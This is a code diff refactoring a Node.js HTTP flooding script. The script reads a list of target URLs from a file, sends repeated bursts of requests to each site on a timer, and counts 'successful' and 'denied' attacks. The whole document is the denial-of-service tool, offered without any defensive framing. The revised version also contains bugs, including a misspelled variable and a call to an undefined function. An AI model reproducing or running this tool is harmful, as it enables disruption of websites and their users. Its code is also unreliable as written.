@@ -1,89 +1,106 @@
 const SITES_FILE = 'urls.txt'; // file with sites list
 const ATTACK_COUNT = 10; // number of attacks per site
-const DELAY_BETWEEN_ATTACK = 30000; // ms 60000 = 1min
-const SUCCESS_MESSAGE = true; // show success message
+const DELAY_BETWEEN_ATTACK = 25000; // ms 60000 = 1min
+const SUCCESS_MESSAGE = false; // show success message
 
 const request = require('request');
 const fs = require('fs');
 const readline = require('readline');
 
 const TIME_START_ATTACK = new Date();
-const urls = [];
-const statistics = {
-  success: 0,
-  denied: 0,
-};
 
-function repeatFunction(url, func, times) {
-  if (times <= 0) return;
-  func(url);
-  repeatFunction(url, func, --times);
+function timeAfterStart() {
+  const currentTime = new Date() - TIME_START_ATTACK;
+  const s = Math.floor((currentTime / 1000) % 60);
+  const m = Math.floor((currentTime / (1000 * 60)) % 60);
+  const h = Math.floor(currentTime / (1000 * 60 * 60));
+  return `${h < 10 ? '0' + h : h}:${m < 10 ? '0' + m : m}:${
+    s < 10 ? '0' + s : s
+  }`;
+}
+class Site {
+  #url;
+  #attackTimes = 1;
+  #successMessage;
+
+  static denied = 0;
+  static success = 0;
+
+  constructor(url, attackTimes = 1, successMessage = false) {
+    this.#url = url;
+    this.#attackTimes = attackTimes;
+    this.#successMessage = successMessage;
+  }
+
+  consoleMessage(attackStatus, statusCode) {
+    console.log(
+      `${attackStatus} attack ${this.#url} ${
+        attackStatus === 'Success' ? '' : 'error '
+      }code: ${statusCode}`
+    );
+  }
+
+  attackUrl() {
+    return new Promise((resolve, reject) => {
+      request(this.#url, (err, res, body) => {
+        const attackStatus = body?.length ? 'Success' : 'Denied';
+        attackStatus === 'Success' ? Site.success++ : Site.denied++;
+
+        if (err) reject(err);
+
+        resolve({ attackStatus, res });
+      });
+    });
+  }
+
+  repeatAttack(times) {
+    if (times <= 0) return;
+    this.startAttack(false);
+    this.repeatAttack(--times);
+  }
+
+  startAttack(testAttack = true) {
+    this.attackUrl()
+      .then(({ attackStatus, res }) => {
+        this.#successMessage &&
+          this.consoleMessage(attackStatus, res.statusCode);
+        testAttack && this.repeatAttack(this.#attackTimes);
+      })
+      .catch(({ errno }) => {
+        this.consoleMessage('Denied', errno);
+      });
+  }
 }
 
 async function updateUrls() {
-  urls.length = 0;
+  const sites = [];
   const fileStream = fs.createReadStream(SITES_FILE);
   const rl = readline.createInterface({
     input: fileStream,
     crlfDelay: Infinity,
   });
 
-  for await (const line of rl) {
-    if (!line.includes('!')) urls.push(line);
+  for await (const url of rl) {
+    if (!ulr.includes('!'))
+      sites.push(new Site(url, ATTACK_COUNT, SUCCESS_MESSAGE));
   }
+  return sites;
 }
 
-function attackSite(url, testAttack = false) {
-  request(url, bodyRequest.bind({ url, testAttack }));
-}
+async function startAttackSites() {
+  const sites = await updateUrls();
 
-function timeAfterStart() {
-  const currentTime = new Date() - TIME_START_ATTACK;
-  const s = Math.floor((currentTime / 1000) % 60);
-  const m = Math.floor((currentTime / (1000 * 60)) % 60);
-  const h = Math.floor((currentTime / (1000 * 60 * 60)) % 24);
-  return `${h < 10 ? '0' + h : h}:${m < 10 ? '0' + m : m}:${
-    s < 10 ? '0' + s : s
-  }`;
-}
+  sites.forEach((site) => {
+    site.startAttack();
+  });
 
-function bodyRequest(err, res, body) {
-  const attackStatus = body?.length ? 'Success' : 'Denied';
-  const { url, testAttack } = this;
-  try {
-    if (err) throw err;
-    if (SUCCESS_MESSAGE) {
-      console.log(
-        `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} code: ${
-          res.statusCode
-        }`
-      );
-    }
-  } catch (e) {
-    console.log(
-      `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} error code: ${
-        e.errno
-      }`
-    );
-  }
-  if (attackStatus === 'Success' && testAttack) {
-    repeatFunction(url, attackSite, ATTACK_COUNT);
-  }
-  attackStatus === 'Success' ? statistics.success++ : statistics.denied++;
-}
-
-async function startAttack() {
   console.log(
-    `ATTACK STATISTICS: SUCCESS = ${statistics.success}, DENIED = ${statistics.denied}`
+    `Sites count: ${sites.length}, duration: ${timeAfterStart()}, Success: ${
+      Site.success
+    }, Denied: ${Site.denied}`
   );
-  await updateUrls();
-  console.log(
-    `Sites count: ${urls.length}, attack duration: ${timeAfterStart()}`
-  );
-  if (urls.length) for await (const url of urls) attackSite(url, true);
-  setTimeout(startAttack, DELAY_BETWEEN_ATTACK);
+  setTimeout(starts, DELAY_BETWEEN_ATTACK);
 }
 
-startAttack(); // main function
-
+startAttackSites();
 console.log('Attack had been started....');
